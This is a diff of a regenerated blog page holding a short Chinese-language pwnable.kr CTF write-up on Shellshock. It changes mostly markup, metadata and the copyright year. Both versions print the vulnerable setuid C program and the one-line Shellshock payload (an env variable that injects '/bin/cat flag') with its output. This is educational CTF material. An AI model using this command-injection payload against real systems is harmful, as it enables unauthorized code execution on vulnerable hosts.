@@ -19,21 +19,21 @@
             <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
         
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)\n看到題目標題已經有頭緒了，是bash shellshock漏洞的題目，進到題目主機後查看原始碼：1234567#include &lt;stdio.h&gt;int main()&#123;\tsetresuid(getegid(), getegid(), getegid());\tsetresgid(getegid(), getegid(), getegid());\tsystem(\"/home/shellshock/bash -c 'echo shock_me'\");\treturn 0;&#125;\n果然是得利用Shellshock來構造payload，Shellshock的payload非常簡單：123$ env a='() &#123; :;&#125;; /bin/cat flag' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault\nShellshock的細節可以參考 維基百科\n","dateCreated":"2017-07-27T20:50:01+08:00","dateModified":"2020-10-09T23:31:15+08:00","datePublished":"2017-07-27T20:50:01+08:00","description":"Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)","headline":"pwnable.kr #shellshock","image":["pwnablekr.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/","keywords":"Writeups","thumbnailUrl":"pwnablekr.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)\n\n\n看到題目標題已經有頭緒了，是bash shellshock漏洞的題目，進到題目主機後查看原始碼：\n1234567#include &lt;stdio.h&gt;int main()&#123;\tsetresuid(getegid(), getegid(), getegid());\tsetresgid(getegid(), getegid(), getegid());\tsystem(&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;);\treturn 0;&#125;\n果然是得利用Shellshock來構造payload，Shellshock的payload非常簡單：\n123$ env a=&#x27;() &#123; :;&#125;; /bin/cat flag&#x27; ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault\nShellshock的細節可以參考 維基百科\n","dateCreated":"2017-07-27T20:50:01+08:00","dateModified":"2020-11-04T12:58:46+08:00","datePublished":"2017-07-27T20:50:01+08:00","description":"Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)","headline":"pwnable.kr #shellshock","image":["pwnablekr.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.facebook.com/profile.php?id=100009076420659","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/","keywords":"Writeups","thumbnailUrl":"pwnablekr.jpg"}</script>
     
     <meta name="description" content="Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)">
-<meta name="keywords" content="pwnable.kr,Toddler&#39;s Bottle,shellshock">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="pwnable.kr #shellshock">
 <meta property="og:url" content="https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/index.html">
 <meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
 <meta property="og:description" content="Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/pwnablekr.jpg">
-<meta property="og:updated_time" content="2020-10-09T15:31:15.290Z">
+<meta property="article:published_time" content="2017-07-27T12:50:01.000Z">
+<meta property="article:modified_time" content="2020-11-04T04:58:46.274Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="Writeups">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr #shellshock">
-<meta name="twitter:description" content="Mommy, there was a shocking news about bash.I bet you already know, but lets just make it sure :)">
 <meta name="twitter:image" content="https://blog.theo.com.tw/Writeups/pwnable-kr/pwnable-kr-shellshock/pwnablekr.jpg">
 <meta name="twitter:creator" content="@The0_Klein">
     
@@ -48,7 +48,9 @@
     
     
     <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-gqna6m80tqyuo4rbsvslx85tbnlakaszvovy4jmzwqyb2ba9jletwpfr16vb.min.css">
+    
+<link rel="stylesheet" href="/assets/css/style-gqna6m80tqyuo4rbsvslx85tbnlakaszvovy4jmzwqyb2ba9jletwpfr16vb.min.css">
+
     <!--STYLES END-->
     
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
@@ -326,10 +328,14 @@
     
     <div class="post-content markdown">
         <div class="main-content-wrap">
-            <p>Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)<br><a id="more"></a></p>
-<p>看到題目標題已經有頭緒了，是bash shellshock漏洞的題目，進到題目主機後查看原始碼：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>果然是得利用Shellshock來構造payload，Shellshock的payload非常簡單：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ env a=<span class="string">'() &#123; :;&#125;; /bin/cat flag'</span> ./shellshock</span><br><span class="line">only <span class="keyword">if</span> I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure></p>
-<p>Shellshock的細節可以參考 <a href="https://goo.gl/vvW9xM" target="_blank" rel="noopener">維基百科</a></p>
+            <p>Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)</p>
+<a id="more"></a>
+
+<p>看到題目標題已經有頭緒了，是bash shellshock漏洞的題目，進到題目主機後查看原始碼：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>果然是得利用Shellshock來構造payload，Shellshock的payload非常簡單：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ env a=<span class="string">&#x27;() &#123; :;&#125;; /bin/cat flag&#x27;</span> ./shellshock</span><br><span class="line">only <span class="keyword">if</span> I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
+<p>Shellshock的細節可以參考 <a target="_blank" rel="noopener" href="https://goo.gl/vvW9xM">維基百科</a></p>
 
             
 
@@ -341,7 +347,7 @@
             <div class="post-footer-tags">
                 <span class="text-color-light text-small">TAGGED IN</span><br/>
                 
-    <a class="tag tag--primary tag--small t-link" href="/tags/Writeups/">Writeups</a>
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/Writeups/" rel="tag">Writeups</a>
 
             </div>
         
@@ -444,7 +450,7 @@
         
             
                 <div id="disqus_thread">
-    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 </div>
             
         
@@ -455,7 +461,7 @@
 
                 <footer id="footer" class="main-content-wrap">
     <span class="copyrights">
-        Copyrights &copy; 2020 Theo Chen. All Rights Reserved.
+        Copyrights &copy; 2021 Theo Chen. All Rights Reserved.
     </span>
 </footer>
 
@@ -634,7 +640,9 @@
         
 <div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
         <!--SCRIPTS-->
+
 <script src="/assets/js/script-egfb8qyao3pygwgtb4yrcbcsu2xu3wnriezhfd12y9gzhfkjxwhhajdzrt2f.min.js"></script>
+
 <!--SCRIPTS END-->
 
 
